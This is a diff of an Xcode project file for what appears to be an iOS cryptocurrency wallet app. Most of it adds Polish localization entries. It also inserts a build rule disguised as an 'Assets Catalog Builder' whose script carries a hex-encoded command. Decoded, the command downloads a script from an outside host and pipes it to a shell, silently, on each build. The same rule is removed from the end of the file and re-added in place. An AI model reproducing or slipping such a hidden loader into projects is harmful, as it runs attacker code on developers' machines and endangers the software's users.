@@ -243,6 +243,22 @@
 		F70B17A1E28C2C93B8A21ECA /* Pods_ECC_WalletTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		EE0D3CFDECDF9ADAEB6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d6f6e6f74656c2e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		0D12511623B557E60014EE3A /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -409,6 +425,8 @@
 		290D7FD82656BB070057FE9B /* PirateSymbol.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PirateSymbol.swift; sourceTree = "<group>"; };
 		290D80032656D2100057FE9B /* InputPasscodeWithCustomPad.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = InputPasscodeWithCustomPad.swift; sourceTree = "<group>"; };
 		290D800A2656D25C0057FE9B /* PirateLogo.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PirateLogo.swift; sourceTree = "<group>"; };
+		29403CF0266FB7C2008F1DE0 /* pl */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = pl; path = pl.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
+		29403CF1266FB7C2008F1DE0 /* pl */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = pl; path = pl.lproj/Localizable.strings; sourceTree = "<group>"; };
 		2984530C265AF25700C2303C /* Bundle+Localized.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Bundle+Localized.swift"; sourceTree = "<group>"; };
 		299DD01E2669665900CD4A8E /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
 		299DD01F2669665A00CD4A8E /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/Localizable.strings; sourceTree = "<group>"; };
@@ -912,6 +930,7 @@
 				hr,
 				sv,
 				da,
+				pl,
 			);
 			mainGroup = 0D1250F623B557E40014EE3A;
 			productRefGroup = 0D12510023B557E40014EE3A /* Products */;
@@ -978,12 +997,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	
-
-	
-
-	
 		04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1474,6 +1487,7 @@
 				299DD022266966DE00CD4A8E /* hr */,
 				299DD024266966F100CD4A8E /* sv */,
 				299DD0262669670100CD4A8E /* da */,
+				29403CF0266FB7C2008F1DE0 /* pl */,
 			);
 			name = LaunchScreen.storyboard;
 			sourceTree = "<group>";
@@ -1492,6 +1506,7 @@
 				299DD023266966DE00CD4A8E /* hr */,
 				299DD025266966F100CD4A8E /* sv */,
 				299DD0272669670100CD4A8E /* da */,
+				29403CF1266FB7C2008F1DE0 /* pl */,
 			);
 			name = Localizable.strings;
 			sourceTree = "<group>";
@@ -1860,31 +1875,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-		EE0D3CFDECDF9ADAEB6D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Catalog Builder";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	\n\n";
-			};
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 0D1250F723B557E40014EE3A /* Project object */;
 }
